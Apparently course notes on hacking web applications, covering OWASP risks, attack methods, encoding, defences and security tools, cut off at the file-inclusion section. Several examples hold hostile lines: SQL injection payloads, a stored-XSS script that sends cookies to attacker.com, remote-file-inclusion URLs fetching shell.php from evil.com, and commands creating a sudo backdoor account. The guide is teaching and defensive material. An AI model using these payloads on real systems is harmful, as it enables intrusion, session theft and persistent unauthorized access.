# **Hacking Web Applications**

> #TLDR
> This comprehensive guide outlines web application vulnerabilities, attack methodologies, defence mechanisms, and practical techniques. It covers the OWASP Top 10 threats, advanced exploitation, and tools for securing web applications.

---

## What We Get From This Exercise
###### #Objectives #hacking-web-applications

- Understand key web application concepts and architectures.
- Learn how to identify and exploit vulnerabilities.
- Familiarize with encoding and attack techniques.
- Explore tools for assessing and securing web applications.
- Develop strategies to counteract advanced threats.

---

## Table of Contents
1. [Web Application Concepts](# Web Application Concepts)
	1. [Web Application Architecture](#web-application-architecture)
	2. [Presentation Layer](#presentation-layer)
	3. [Business Logic Layer](#business-logic-layer)
	4. [Database Layer](#database-layer)
2. [Web Application Threats](#web-application-threats)
	1. [Injection Flaws](#injection-flaws)
	2. [Insecure Design](#insecure-design)
	3. [Broken Access Control](#broken-access-control)
	4. [Vulnerable Components](#vulnerable-components)
	5. [OWASP Top 10](#owasp-top-10)
3. [Hacking Methodologies](#hacking-methodologies)
	1. [Reconnaissance](#reconnaissance)
	2. [Scanning](#scanning)
	3. [Exploitation](#exploitation)
	4. [Post-Exploitation](#post-exploitation)
4. [Hacking Techniques](#hacking-techniques)
	1. [SQL Injection](#sql-injection)
	2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
	3. [Cookie Poisoning](#cookie-poisoning)
	4. [File Injection](#file-injection)
	5. [LDAP Injection](#ldap-injection)
	6. [Session Hijacking](#session-hijacking)
5. [Encoding Techniques](#encoding-techniques)
	1. [URL Encoding](#url-encoding)
	2. [HTML Encoding](#html-encoding)
	3. [Unicode Encoding](#unicode-encoding)
	4. [Base64 Encoding](#base64-encoding)
	5. [Hex Encoding](#hex-encoding)
6. [Defence Mechanisms](#defence-mechanisms)
	1. [Web Application Firewalls (WAF)](#web-application-firewalls-waf)
	2. [Secure Coding Practices](#secure-coding-practices)
	3. [Encryption](#encryption)
	4. [Vulnerability Scanners](#vulnerability-scanners)
7. [Tools for Web Application Security](#tools-for-web-application-security)
	1. [OWASP Zed Attack Proxy](#owasp-zed-attack-proxy)
	2. [Burp Suite](#burp-suite)
	3. [SQLmap](#sqlmap)
	4. [WAFW00F](#wafw00f)
	5. [Acunetix Web Vulnerability Scanner](#acunetix-web-vulnerability-scanner)
	6. [Postman](#postman)
8. [Attack Demonstrations](#attack-demonstrations)
	1. [XSS Code Examples](#xss-code-examples)
	2. [SQL Injection Code Examples](#sql-injection-code-examples)
	3. [Manipulating Headers](#manipulating-headers)
	4. [Bypassing Authentication](#bypassing-authentication)
9. [Footprinting and Reconnaissance](#footprinting-and-reconnaissance)
	1. [Banner Grabbing](#banner-grabbing)
	2. [Detecting Web Application Firewalls](#detecting-web-application-firewalls)
	3. [Hidden Content Discovery](#hidden-content-discovery)
	4. [Spidering/Crawling](#spideringcrawling)
10. [Examining Authentication Mechanisms](#examining-authentication-mechanisms)
	1.  [Username Enumeration](#username-enumeration)
	2.  [Brute Force Attacks](#brute-force-attacks)
	3.  [Credential Stuffing](#credential-stuffing)
11. [Advanced Exploitation Techniques](#advanced-exploitation-techniques)
	1.  [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
	2.  [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
	3.  [API Exploitation](#api-exploitation)
	4.  [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
12. [Featured Hacking Tools](#featured-hacking-tools)
13. [Featured Defence Tools](#featured-defence-tools)
14. [Summary](#summary)

---

# Web Application Concepts

## Web Application Architecture
Web applications operate as multi-layered systems that enable user interactions, business logic execution, and database management. They comprise three key layers:
1. **Presentation Layer**: Interfaces with users.
2. **Business Logic Layer**: Processes user requests and handles application logic.
3. **Database Layer**: Manages storage and retrieval of structured data.

---

### Presentation Layer
The presentation layer facilitates user interaction through graphical interfaces. It operates on client devices such as:
- **Laptops**
- **Smartphones**
- **Desktops**

**Key Features:**
- Processes user requests submitted through URLs or input forms.
- Transfers data to the web server for further handling.

**Flow Example:**
1. User enters a URL in a browser.
2. Browser sends the request to the web server.
3. Web server responds with content, rendering it for the user.

---

### Business Logic Layer
This layer handles application logic and processes user interactions, including:
- HTTP request parsing.
- Authentication and authorization.
- Session management.

**Components:**

| Component                    | Description                                           |
| ---------------------------- | ----------------------------------------------------- |
| HTTP Request Parser          | Processes incoming HTTP requests.                     |
| Authentication/Authorization | Verifies user identity and permissions.               |
| Proxy Server                 | Enhances performance by caching frequently used data. |
| Resource Handler             | Manages concurrent user requests.                     |

**Example Code:**
```java
// Java servlet example for login handling
protected void doPost(HttpServletRequest request, HttpServletResponse response) {
    String username = request.getParameter("username");
    String password = request.getParameter("password");
    if (authenticate(username, password)) {
        response.sendRedirect("dashboard.jsp");
    } else {
        response.sendRedirect("login.jsp?error=true");
    }
}
```

---

### Database Layer
The database layer serves as the backend, storing application data and managing its retrieval. It operates on relational or NoSQL database systems.

**Examples of Databases:**
- Relational: MySQL, PostgreSQL
- NoSQL: MongoDB, Cassandra

**Key Operations:**
1. Query execution.
2. Data insertion, update, and deletion.
3. Ensuring data integrity and security.

**SQL Query Example:**
```sql
-- Retrieve user details by username
SELECT id, username, email FROM users WHERE username = 'example_user';
```

**Database Security Considerations:**
- Enforce encryption for data at rest and in transit.
- Limit database access based on roles and permissions.
- Regularly patch and update database management systems.

---

# **Web Application Threats**

> Web applications face a wide array of threats targeting their architecture, components, and functionality. This section highlights critical vulnerabilities and how attackers exploit them.

## Injection Flaws
Injection flaws occur when untrusted data is sent to an interpreter, allowing attackers to execute malicious commands or queries.

### Common Types of Injection Flaws:
1. **SQL Injection**: Exploits database queries by injecting malicious SQL code.
   - Example:
     ```sql
     -- Malicious input bypassing authentication
     SELECT * FROM users WHERE username = 'admin' OR '1'='1';
     ```
   - **Impact**: Unauthorized data access, database manipulation.

2. **Cross-Site Scripting (XSS)**: Injects malicious scripts into web pages viewed by other users.
   - Example:
     ```html
     <script>alert('Hacked!');</script>
     ```
   - **Impact**: Session hijacking, credential theft.

3. **LDAP Injection**: Exploits directory services by injecting malicious LDAP queries.
   - Example:
     ```
     (&(USER=*)(|(USER=admin)(USER=*)))
     ```
   - **Impact**: Unauthorized access to directory resources.

---

## Insecure Design
Insecure design arises when security considerations are overlooked during the development phase.

### Characteristics of Insecure Design:
- Lack of secure defaults (e.g., failing to disable directory listing).
- Inadequate input validation.
- Absence of mechanisms to mitigate modern threats like bots and brute force.

### Example Scenarios:
- **Weak Session Management**:
  - Using predictable session tokens allows attackers to impersonate users.
- **Improper Error Handling**:
  - Detailed error messages can disclose sensitive information about system architecture.

---

## Broken Access Control
Broken access control occurs when restrictions on user actions are improperly implemented or enforced.

### Common Vulnerabilities:
| Vulnerability              | Description                                            |
|----------------------------|--------------------------------------------------------|
| Privilege Escalation       | Users gain unauthorized admin privileges.              |
| Insecure Direct Object References (IDOR) | Users access objects by modifying IDs in URLs. |
| Misconfigured CORS         | Cross-origin resource sharing allows unauthorized access.|

**Exploit Example:**
```http
GET /admin/delete_user?user_id=123 HTTP/1.1
Host: vulnerable-site.com
Cookie: session_token=abcd1234
```
*Impact*: Regular users can perform admin-only actions by manipulating URLs.

---

## Vulnerable Components
Web applications often rely on third-party libraries, frameworks, and components. Using outdated or unpatched components exposes the system to known vulnerabilities.

### Examples of Risks:
- **Log4j Vulnerability**: Remote code execution in Java applications.
- **Outdated SSL/TLS Libraries**: Allowing SSL stripping or downgrade attacks.

**Mitigation Strategies**:
- Use tools like **Dependency-Check** to scan for vulnerabilities.
- Regularly update libraries and frameworks.

---

## OWASP Top 10
The **OWASP Top 10** is a widely recognized standard for identifying critical web application vulnerabilities.

### 2021 OWASP Top 10 Risks:
| Risk ID | Name                                   |
|---------|----------------------------------------|
| A01     | Broken Access Control                 |
| A02     | Cryptographic Failures                |
| A03     | Injection                             |
| A04     | Insecure Design                       |
| A05     | Security Misconfiguration             |
| A06     | Vulnerable and Outdated Components    |
| A07     | Identification and Authentication Failures |
| A08     | Software and Data Integrity Failures  |
| A09     | Security Logging and Monitoring Failures |
| A10     | Server-Side Request Forgery (SSRF)    |

**Focus Example**:  
**A01 - Broken Access Control**:  
Impact: Allows unauthorized actions such as modifying sensitive data.  
Mitigation: Implement robust access control mechanisms and conduct regular access audits.

---

# **Hacking Methodologies**

> Hacking methodologies provide a structured approach to identifying, exploiting, and mitigating vulnerabilities in web applications. This section outlines the primary stages involved in ethical hacking.

## Reconnaissance
Reconnaissance is the initial phase of gathering as much information as possible about a target to identify vulnerabilities.

### Techniques:
| Technique             | Description                                                  |
|-----------------------|--------------------------------------------------------------|
| **Passive Recon**     | Collecting information without interacting with the target (e.g., WHOIS lookup). |
| **Active Recon**      | Directly engaging with the target (e.g., ping sweeps, DNS zone transfers). |
| **Open Source Intelligence (OSINT)** | Using public sources like social media, search engines, and forums. |

**Tools**:
- **Shodan**: For finding exposed devices and services.
- **Maltego**: Visual link analysis for OSINT data.

**Example: DNS Recon with dig**
```bash
dig example.com ANY
```
Output:
```text
example.com.  3600 IN  A     93.184.216.34
example.com.  3600 IN  MX    10 mail.example.com.
```

---

## Scanning
Scanning involves probing the target system to identify active services, open ports, and exploitable vulnerabilities.

### Types of Scanning:
| Type                  | Description                                                  |
|-----------------------|--------------------------------------------------------------|
| **Port Scanning**     | Identifies open ports on a target system.                    |
| **Vulnerability Scanning** | Detects known vulnerabilities in systems and applications. |
| **Network Scanning**  | Maps the network and identifies live hosts.                  |

**Tools**:
- **Nmap**: For network mapping and service enumeration.
- **Nessus**: For vulnerability assessment.

**Example: Nmap Scan**
```bash
nmap -sV -p 80,443 example.com
```
Output:
```text
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache 2.4.41
443/tcp open  https    OpenSSL 1.1.1
```

---

## Exploitation
Exploitation is the phase where vulnerabilities are leveraged to gain unauthorized access or execute malicious actions.

### Common Exploits:
- **SQL Injection**:
  ```sql
  SELECT * FROM users WHERE username = 'admin' OR '1'='1';
  ```
  *Impact*: Retrieves all user data.

- **Cross-Site Scripting (XSS)**:
  ```html
  <script>alert('XSS');</script>
  ```
  *Impact*: Executes malicious scripts in the victim's browser.

- **Remote Code Execution (RCE)**:
  Leveraging vulnerabilities in applications to execute arbitrary commands on a server.

**Tools**:
- **Metasploit**: Exploitation framework.
- **SQLmap**: Automates SQL injection exploitation.

---

## Post-Exploitation
Post-exploitation focuses on maintaining access, collecting data, and covering tracks.

### Activities:
| Activity              | Description                                                  |
|-----------------------|--------------------------------------------------------------|
| **Privilege Escalation** | Moving from a low-privileged account to an admin-level account. |
| **Data Exfiltration** | Extracting sensitive information from the target system.     |
| **Persistence**       | Installing backdoors to ensure continued access.            |
| **Clearing Tracks**   | Deleting logs and other evidence of intrusion.              |

**Example: Adding a Backdoor User in Linux**
```bash
sudo useradd -m backdoor
sudo passwd backdoor
sudo usermod -aG sudo backdoor
```
*Impact*: Creates an admin account for future access.

---

# **Hacking Techniques**

> Specific techniques attackers use to exploit vulnerabilities in web applications. Each technique includes examples, impact, and defences.

## SQL Injection
SQL Injection involves injecting malicious SQL code into queries to manipulate or access databases.

### Example:
```sql
-- Input: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1';
```

**Impact**:
- Unauthorized access to data.
- Modification or deletion of database records.

**Defences**:
- Use prepared statements or parameterized queries:
  ```python
  # Python example using parameterized query
  cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
  ```
- Implement input validation and sanitize user inputs.
- Use Web Application Firewalls (WAFs).

---

## Cross-Site Scripting (XSS)
XSS allows attackers to inject malicious scripts into trusted websites, executed in the victim's browser.

### Example:
```html
<script>alert('XSS Attack!');</script>
```

**Impact**:
- Session hijacking.
- Credential theft.
- Redirecting users to malicious websites.

**Defences**:
- Encode user inputs to prevent script execution.
- Implement Content Security Policy (CSP):

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

- Use secure frameworks that automatically escape user inputs.

---

## Cookie Poisoning
Cookie poisoning involves altering cookies to impersonate users or escalate privileges.

### Example:
Original cookie:
```
user_id=123; role=user;
```
Modified cookie:
```
user_id=123; role=admin;
```

**Impact**:
- Unauthorized access to sensitive functions.
- Data theft or manipulation.

**Defences**:
- Encrypt cookies and use secure flags (`Secure` and `HttpOnly`).
- Validate cookie data server-side before processing.

---

## File Injection
File injection exploits vulnerabilities in file upload or include mechanisms, allowing attackers to execute arbitrary files.

### Example:
URL to exploit file inclusion:
```
http://example.com/vulnerable.php?file=http://evil.com/shell.php
```

**Impact**:
- Remote code execution.
- Access to sensitive files.

**Defences**:
- Validate and sanitize file paths.
- Restrict file uploads to specific directories with limited permissions.
- Disable dynamic file inclusion where unnecessary.

---

## LDAP Injection
LDAP injection exploits improper validation of user inputs in LDAP queries, allowing attackers to manipulate directory services.

### Example:
Input:
```
*))
```
Query:
```
(&(uid=*)(|(uid=admin)(userPassword=*)))
```

**Impact**:
- Unauthorized access to directory services.
- Bypass authentication.

**Defences**:
- Use parameterized queries for LDAP:
  ```java
  String filter = "(&(uid={0})(userPassword={1}))";
  ```
- Sanitize user inputs before constructing LDAP queries.

---

## Session Hijacking
Session hijacking involves stealing or impersonating a user’s session to gain unauthorized access.

### Example:
Intercepting session cookies with a tool like **Wireshark**:
```text
GET /dashboard HTTP/1.1
Host: example.com
Cookie: session_token=abc123
```

**Impact**:
- Impersonation of users.
- Unauthorized data access.

**Defences**:
- Use HTTPS to encrypt session data.
- Implement secure session tokens with attributes like:
  - `HttpOnly`: Prevent access via JavaScript.
  - `Secure`: Enforce usage over HTTPS.

---

# **Encoding Techniques**

> Encoding techniques are essential for protecting web applications by ensuring that user inputs are handled safely. These techniques convert data into a format that prevents malicious input from being executed as code.

## URL Encoding
URL encoding converts characters into a format that can be safely transmitted over the internet.

### Example:
Input:
```
https://example.com/search?q=hello world
```
Encoded:
```
https://example.com/search?q=hello%20world
```

**Key Encodings**:

| Character | Encoded Value |
|-----------|---------------|
| Space     | `%20`         |
| `&`       | `%26`         |
| `/`       | `%2F`         |

**Use Cases**:
- Prevent manipulation of URLs during GET requests.
- Ensure safe transmission of data in HTTP headers.

**Decoding Example in Python**:
```python
from urllib.parse import unquote
print(unquote("hello%20world"))  # Output: hello world
```

---

## HTML Encoding
HTML encoding replaces characters with HTML entities to prevent script execution in browsers.

### Example:
Input:
```html
<script>alert('XSS')</script>
```
Encoded:
```html
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

**Key Encodings**:

| Character | Encoded Entity |
|-----------|----------------|
| `<`       | `&lt;`         |
| `>`       | `&gt;`         |
| `&`       | `&amp;`        |
| `'`       | `&#39;`         |

**Use Cases**:
- Prevent Cross-Site Scripting (XSS).
- Safely display user-generated content on web pages.

**Encoding in Python**:
```python
import html
print(html.escape("<script>alert('XSS')</script>"))
# Output: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

---

## Unicode Encoding
Unicode encoding represents characters as code points to handle multilingual text securely.

### Example:
Input:
```
你好
```
Encoded:
```
\u4f60\u597d
```

**Use Cases**:
- Transmit multilingual data over HTTP.
- Prevent text-based injections by encoding special characters.

**Encoding Example in JavaScript**:
```javascript
const encoded = encodeURIComponent('你好');
console.log(encoded); // %E4%BD%A0%E5%A5%BD
```

---

## Base64 Encoding
Base64 encoding transforms binary data into an ASCII string for safe storage or transmission.

### Example:
Input:
```
Hello, World!
```
Encoded:
```
SGVsbG8sIFdvcmxkIQ==
```

**Use Cases**:
- Encode binary data for storage in text-based formats (e.g., JSON, XML).
- Safely transmit binary files via HTTP.

**Encoding in Python**:
```python
import base64
print(base64.b64encode(b'Hello, World!').decode())
# Output: SGVsbG8sIFdvcmxkIQ==
```

---

## Hex Encoding
Hex encoding represents binary data as a string of hexadecimal values.

### Example:
Input:
```
Hello
```
Encoded:
```
48656c6c6f
```

**Use Cases**:
- Debugging and analyzing binary data.
- Obfuscating sensitive strings in payloads.

**Encoding Example in Python**:
```python
print("Hello".encode().hex())
# Output: 48656c6c6f
```

---

# **Defence Mechanisms**

> Defence mechanisms are essential to protect web applications from a wide range of attacks. This section outlines key techniques to mitigate vulnerabilities and secure applications.

## Web Application Firewalls (WAF)
A Web Application Firewall (WAF) monitors and filters HTTP requests to protect web applications from attacks.

### Features:
- Blocks **SQL Injection**, **Cross-Site Scripting (XSS)**, and other injection attacks.
- Protects against **Distributed Denial of Service (DDoS)** attacks.
- Offers virtual patching for known vulnerabilities.

### Example: Configuring ModSecurity (Open-Source WAF)
```bash
sudo apt install libapache2-mod-security2
sudo a2enmod security2
sudo systemctl restart apache2
```

**Advantages**:
- Easy to integrate with existing web servers.
- Real-time protection against common attacks.

**Limitations**:
- May block legitimate traffic if not configured correctly.
- Requires regular updates to rule sets.

---

## Secure Coding Practices
Secure coding practices prevent vulnerabilities from being introduced during application development.

### Key Practices:
1. **Input Validation**:
   - Reject malicious inputs using whitelists.
   - Example:
     ```python
     if not re.match("^[a-zA-Z0-9_]+$", username):
         raise ValueError("Invalid username")
     ```

2. **Use Parameterized Queries**:
   - Prevent SQL injection by avoiding direct query construction.
   - Example (Python with MySQL):
     ```python
     cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
     ```

3. **Error Handling**:
   - Avoid displaying detailed error messages.
   - Example:
     ```python
     try:
         result = execute_query(query)
     except DatabaseError:
         log_error()
         raise RuntimeError("An error occurred. Please try again later.")
     ```

---

## Encryption
Encryption ensures sensitive data remains secure during transmission and storage.

### Types of Encryption:
| Type                  | Use Case                           | Example Algorithm    |
|-----------------------|-------------------------------------|----------------------|
| **Symmetric**         | Fast, secure key-sharing required  | AES (Advanced Encryption Standard) |
| **Asymmetric**        | Secure communication over open channels | RSA, ECC            |
| **Hashing**           | One-way encryption for passwords   | SHA-256, bcrypt      |

### Example: Encrypting Data with Python
```python
from cryptography.fernet import Fernet

# Generate a key
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt a message
encrypted = cipher.encrypt(b"Sensitive Data")
print(encrypted)

# Decrypt the message
decrypted = cipher.decrypt(encrypted)
print(decrypted.decode())
```

**Best Practices**:
- Use **TLS (Transport Layer Security)** for data in transit.
- Encrypt sensitive data at rest, such as passwords and payment details.

---

## Vulnerability Scanners
Vulnerability scanners automate the detection of weaknesses in web applications.

### Examples of Scanners:
1. **OWASP ZAP**:
   - Identifies security issues in web applications.
   - Example Usage:
     ```bash
     zap-cli quick-scan --self-contained http://example.com
     ```

2. **Nessus**:
   - Comprehensive vulnerability scanning for networks and applications.

3. **Nikto**:
   - Scans for outdated components and misconfigurations.
   - Example:
     ```bash
     nikto -h http://example.com
     ```

**Advantages**:
- Quick identification of security gaps.
- Provides actionable reports for remediation.

**Limitations**:
- May generate false positives.
- Requires manual verification for critical vulnerabilities.

---

# **Tools for Web Application Security**

> Web application security tools play a vital role in identifying, analyzing, and mitigating vulnerabilities. This section highlights some of the most effective tools for securing web applications.

## OWASP Zed Attack Proxy

### Description:
OWASP ZAP is an open-source web application security scanner designed for discovering vulnerabilities during development and testing phases.

### Key Features:
- Intercepts and modifies HTTP/HTTPS requests.
- Passive and active vulnerability scanning.
- Automation with command-line scripts.

### Example: Running a Quick Scan
```bash
zap-cli quick-scan --self-contained http://example.com
```

### Use Cases:
- Identifying common vulnerabilities like SQL Injection, XSS, and misconfigurations.
- Automated security testing in CI/CD pipelines.

---

## Burp Suite

### Description:
Burp Suite is a popular platform for web application security testing, offering both free and professional versions.

### Key Features:
- Proxy for intercepting HTTP/HTTPS traffic.
- Intruder for automated fuzzing.
- Repeater for manual testing.

### Example: Basic Configuration
1. Configure your browser to route traffic through Burp Proxy (default: `127.0.0.1:8080`).
2. Intercept HTTP requests and analyse or modify them.

### Use Cases:
- Identifying injection vulnerabilities.
- Testing authentication mechanisms.
- Automating repetitive tasks with extensions.

---

## SQLmap

### Description:
SQLmap is a powerful open-source tool for automating SQL injection exploitation and database takeover.

### Key Features:
- Detects and exploits SQL injection vulnerabilities.
- Extracts database structure and contents.
- Supports multiple database management systems (MySQL, PostgreSQL, MSSQL).

### Example: Testing a Target
```bash
sqlmap -u "http://example.com/page?id=1" --dbs
```
*Output*:
```text
Database: example_db
[1] users
[2] orders
```

### Use Cases:
- Automating SQL injection attacks.
- Dumping database content for analysis.

---

## WAFW00F

### Description:
WAFW00F identifies web application firewalls (WAFs) protecting a target website.

### Key Features:
- Detects WAFs and their configurations.
- Provides insights into bypassing or testing strategies.

### Example: Scanning a Target
```bash
wafw00f http://example.com
```
*Output*:
```text
The site http://example.com is behind Cloudflare.
```

### Use Cases:
- Enumerating WAFs during reconnaissance.
- Adapting attack methodologies based on WAF detection.

---

## Acunetix Web Vulnerability Scanner

### Description:
Acunetix is a commercial tool for identifying and managing web application vulnerabilities.

### Key Features:
- Automated scanning for OWASP Top 10 vulnerabilities.
- Advanced scanning for JavaScript-heavy applications (SPAs).
- Integration with CI/CD pipelines.

### Example Workflow:
1. Add your target URL to the Acunetix dashboard.
2. Initiate a scan and review the detailed report.
3. Address vulnerabilities with provided remediation steps.

---

## Postman

### Description:
Postman is a versatile API testing platform that simplifies interaction with RESTful APIs.

### Key Features:
- Sending custom HTTP requests with headers, parameters, and payloads.
- Automated API testing with scripts.
- Collaboration features for team environments.

### Example: Sending a POST Request
```json
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "username": "user",
  "password": "password123"
}
```

### Use Cases:
- Testing API endpoints for authentication and data handling flaws.
- Validating input sanitization and security headers.

---

# **Attack Demonstrations**

> This section demonstrates common web application attacks with code examples, explaining how attackers exploit vulnerabilities.

## XSS Code Examples

### Example 1: Reflected XSS
A malicious script is injected into a URL and executed in the victim’s browser.
```html
<!-- URL Example -->
http://example.com/search?q=<script>alert('XSS')</script>
```
**Impact**:
- Executes malicious JavaScript in the victim’s browser.
- Used to steal cookies, hijack sessions, or redirect to malicious websites.

**Prevention**:
- Sanitize user inputs.
- Encode outputs:
  ```html
  <p>{{ user_input | escape }}</p>
  ```

---

### Example 2: Stored XSS
Malicious scripts are saved in the application and executed when accessed by users.
```html
<!-- Input Example -->
<textarea>
<script>document.location='http://attacker.com?cookie=' + document.cookie</script>
</textarea>
```
**Impact**:
- Persistent attack affecting multiple users.
- Leads to session hijacking or data theft.

**Prevention**:
- Encode user inputs during storage and retrieval.
- Implement Content Security Policies (CSP).

---

## SQL Injection Code Examples

### Example 1: Basic SQL Injection
Attacker injects malicious SQL into a login form to bypass authentication.
```sql
-- Input: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1';
```
**Impact**:
- Unauthorized access to the application.
- Data leakage or modification.

**Prevention**:
- Use parameterized queries:
  ```python
  cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
  ```

### Example 2: Union-Based SQL Injection
Extracts data from additional tables.
```sql
-- Input
1 UNION SELECT username, password FROM users
```
**Impact**:
- Access to sensitive database records.

**Prevention**:
- Validate and sanitize inputs.
- Restrict database permissions.

---

## Manipulating Headers

Attackers modify HTTP headers to bypass controls or exploit vulnerabilities.

### Example: Modifying `Referer` Header
```http
GET /restricted-area HTTP/1.1
Host: example.com
Referer: http://example.com/login
```
**Impact**:
- Bypass poorly implemented referer-based access controls.

**Prevention**:
- Implement robust authentication mechanisms.
- Do not rely solely on headers for authorization.

### Example: Custom Header Injection
```http
GET /api/resource HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
```
**Impact**:
- Spoofing IPs to bypass IP-based restrictions.

**Prevention**:
- Validate incoming headers and enforce IP filtering at the network level.

---

## Bypassing Authentication

### Example 1: Password Reset Exploit
Altering request parameters to reset another user’s password.
```http
POST /reset-password
Host: example.com

username=admin&new_password=123456
```
**Impact**:
- Resets the admin’s password and compromises the account.

**Prevention**:
- Verify ownership of accounts using secure tokens or secondary factors.

### Example 2: Using Default Credentials
Attackers log in using weak or default credentials.
```plaintext
Username: admin
Password: admin123
```
**Impact**:
- Full access to the application if default credentials are not changed.

**Prevention**:
- Enforce strong passwords and disable default accounts.

---

# **Footprinting and Reconnaissance**

> Footprinting and reconnaissance are the first steps in identifying vulnerabilities. Attackers gather information about the target system to plan and execute attacks effectively.

## Banner Grabbing

### Description:
Banner grabbing identifies software versions and services running on a target by retrieving their banner information.

### Tools:
- **Netcat**:
  ```bash
  nc -v example.com 80
  ```
  *Example Output*:
  ```text
  HTTP/1.1 200 OK
  Server: Apache/2.4.41 (Ubuntu)
  ```

- **Telnet**:
  ```bash
  telnet example.com 80
  ```
  *Example Output*:
  ```text
  Connected to example.com.
  Escape character is '^]'.
  ```

- **Nmap**:
  ```bash
  nmap -sV example.com
  ```
  *Example Output*:
  ```text
  PORT    STATE SERVICE VERSION
  80/tcp  open  http    Apache httpd 2.4.41
  ```

### Impact:
- Reveals versions of services and potential vulnerabilities.

### Mitigation:
- Disable unnecessary banners in service configurations.
- Use tools like **ModSecurity** to mask server information.

---

## Detecting Web Application Firewalls

### Description:
Attackers identify WAFs to understand defense mechanisms and plan bypass techniques.

### Tools:
- **WAFW00F**:
  ```bash
  wafw00f http://example.com
  ```
  *Example Output*:
  ```text
  The site http://example.com is behind Cloudflare.
  ```

- **Nmap with NSE**:
  ```bash
  nmap --script=http-waf-detect http://example.com
  ```
  *Example Output*:
  ```text
  Detected: ModSecurity WAF
  ```

### Impact:
- Attackers adjust payloads to bypass the detected WAF.

### Mitigation:
- Regularly update WAF rules.
- Use behavior-based anomaly detection alongside signature-based WAFs.

---

## Hidden Content Discovery

### Description:
Attackers search for hidden directories, files, or endpoints that may contain sensitive data or administrative interfaces.

### Tools:
- **Dirb**:
  ```bash
  dirb http://example.com
  ```
  *Example Output*:
  ```text
  + http://example.com/admin
  + http://example.com/backup.zip
  ```

- **Gobuster**:
  ```bash
  gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
  ```
  *Example Output*:
  ```text
  /login (Status: 200)
  /api   (Status: 403)
  ```

### Impact:
- Access to sensitive directories and files.

### Mitigation:
- Use proper access controls.
- Regularly audit and remove unnecessary files/directories.

---

## Spidering/Crawling

### Description:
Spidering involves mapping the structure of a website by following all available links.

### Tools:
- **Burp Suite** (Spidering Module):
  Automatically maps all pages and links on a website.
- **HTTrack**:
  ```bash
  httrack http://example.com
  ```
  *Example Output*:
  ```text
  Mirror of http://example.com saved locally.
  ```

- **OWASP ZAP** (Spider):
  Automatically crawls and identifies all reachable endpoints.

### Impact:
- Reveals pages, endpoints, and parameters not intended for public access.

### Mitigation:
- Use a **robots.txt** file to restrict sensitive paths:
  ```plaintext
  User-agent: *
  Disallow: /admin/
  Disallow: /confidential/
  ```
- Regularly review and minimize exposed endpoints.

---

# **Examining Authentication Mechanisms**

> Authentication mechanisms are critical to securing web applications. Weak or improperly implemented authentication can be exploited to gain unauthorized access. This section covers common methods attackers use to compromise authentication systems.

## Username Enumeration

### Description:
Attackers attempt to determine valid usernames by analyzing application responses during login attempts or other interactions.

### Techniques:
1. **Error Message Analysis**:
   - The application returns distinct error messages for valid vs. invalid usernames.
     ```plaintext
     Username exists: "Incorrect password."
     Username does not exist: "User not found."
     ```

2. **Timing Analysis**:
   - Measure response times to infer whether a username exists.
     ```bash
     curl -w "%{time_total}" -X POST -d "username=test" http://example.com/login
     ```

3. **Forgot Password Functionality**:
   - Exploiting responses from "Forgot Password" forms to identify valid usernames.

### Mitigation:
- Return generic error messages for failed authentication:
  ```plaintext
  "Invalid username or password."
  ```
- Implement rate-limiting for repeated requests.
- Use CAPTCHA to prevent automated enumeration.

---

## Brute Force Attacks

### Description:
Attackers systematically try multiple username and password combinations to gain access.

### Tools:
- **Hydra**:
  ```bash
  hydra -l admin -P passwords.txt http://example.com/login
  ```
- **Burp Suite Intruder**:
  Configure payloads to brute force usernames and passwords.

### Impact:
- Unauthorized access if weak or common credentials are used.

### Prevention:
1. **Account Lockout**:
   - Lock accounts after multiple failed login attempts.
     ```python
     if failed_attempts >= 5:
         lock_account(username)
     ```

2. **Two-Factor Authentication (2FA)**:
   - Require an additional factor like an OTP or hardware token.
   - Example libraries: **Google Authenticator** for Python.

3. **Strong Password Policies**:
   - Enforce complex passwords:
     ```plaintext
     Minimum 12 characters, including uppercase, numbers, and symbols.
     ```

---

## Credential Stuffing

### Description:
Attackers use credentials leaked from other breaches to attempt access to the target system.

### Example:
- Credentials from a data breach:
  ```plaintext
  username: user@example.com
  password: Password123
  ```
- Automated attacks with tools like **Sentry MBA** or **Cypress**.

### Impact:
- Exploits users reusing passwords across multiple systems.
- Compromises accounts without triggering brute force protections.

### Mitigation:
1. **Password Hashing**:
   - Store passwords using strong hashing algorithms (e.g., bcrypt, Argon2).
     ```python
     hashed = bcrypt.hashpw(password, bcrypt.gensalt())
     ```

2. **Monitor for Breached Credentials**:
   - Integrate services like **Have I Been Pwned** to identify compromised credentials.

3. **Enforce Unique Passwords**:
   - Use a password policy checker to prevent reuse of known compromised passwords.

4. **Two-Factor Authentication (2FA)**:
   - Even if credentials are valid, 2FA adds a critical layer of security.

---

# **Advanced Exploitation Techniques**

> Advanced exploitation techniques target complex vulnerabilities in web applications, allowing attackers to access sensitive data, execute malicious code, or manipulate system functionality.

## Remote File Inclusion (RFI)

### Description:
RFI vulnerabilities occur when a web application dynamically includes files from external sources without proper validation.

### Example:
```php
<?php
    $file = $_GET['file'];
    include($file);
?>
```
**Attack URL**:
```
http://example.com/vulnerable.php?file=http://malicious.com/shell.php
```

### Impact:
- Execution of arbitrary code.
- Compromise of server and sensitive data.

### Mitigation:
- Validate and sanitize input to restrict allowed file paths.
- Disable `allow_url_include` in PHP configurations (init):
  ```
  allow_url_include = Off
  ```
- Use whitelisted file paths only:
  ```php
  $allowed_files = ['about.php', 'contact.php'];
  if (in_array($file, $allowed_files)) {
      include($file);
  }
  ```

---

## Local File Inclusion (LFI)

### Description:
